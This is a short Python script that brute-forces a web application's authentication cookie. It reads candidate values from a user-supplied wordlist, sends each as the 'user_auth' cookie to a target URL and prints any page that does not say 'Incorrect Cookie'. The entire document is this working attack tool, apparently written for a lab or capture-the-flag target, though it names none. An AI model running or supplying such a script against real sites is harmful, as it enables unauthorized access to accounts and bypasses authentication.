import requests

lines = []
r = input(' what is youre target (http(s)://<ip>/<directory>): ')

open_file = input('what file are you useing: ')

with open(open_file, 'r') as raft:
        lines = raft.readlines()

for i in lines:
        my_cookie = {'user_auth':i.replace("\n","")}

        responce = requests.get(r, cookies=my_cookie)

        currentPageText = responce.text

        if "Incorrect Cookie" not in currentPageText:
                print(responce.text)
